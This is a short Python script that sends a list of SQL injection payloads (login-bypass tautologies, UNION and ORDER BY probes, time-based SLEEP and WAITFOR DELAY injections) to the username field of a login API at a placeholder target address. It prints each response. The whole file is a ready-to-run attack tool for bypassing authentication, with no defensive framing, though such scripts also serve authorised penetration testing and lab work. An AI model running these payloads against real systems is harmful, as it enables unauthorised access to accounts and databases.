import time
import requests


# ============================================================
# Configuration
# ============================================================

TARGET_URL = "http://<target_ip>:4000/api/auth/login"

REQUEST_DELAY = 0.2


# ============================================================
# SQL Injection test payloads
# ============================================================

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin' OR '1'='1'--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' UNION SELECT NULL--",
    "' UNION ALL SELECT NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "'; SELECT 1--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "admin'--",
]


# ============================================================
# Send request
# ============================================================

def send_sqli_request(payload):

    body = {
        "username": payload,
        "password": "test",
    }

    try:
        response = requests.post(
            TARGET_URL,
            json=body,
            timeout=10,
        )

        print(
            f"[+] Payload: {payload!r}"
        )

        print(
            f"    HTTP status: {response.status_code}"
        )

        print(
            f"    Response: {response.text[:200]}"
        )

    except requests.RequestException as e:

        print(
            f"[!] Request failed: {e}"
        )


# ============================================================
# Main
# ============================================================

def main():

    print(
        f"[*] Target: {TARGET_URL}"
    )

    print(
        f"[*] Payloads: {len(SQLI_PAYLOADS)}"
    )

    print()

    for payload in SQLI_PAYLOADS:

        send_sqli_request(payload)

        time.sleep(REQUEST_DELAY)

    print()
    print("[+] Finished sending SQLi test requests.")


if __name__ == "__main__":
    main()
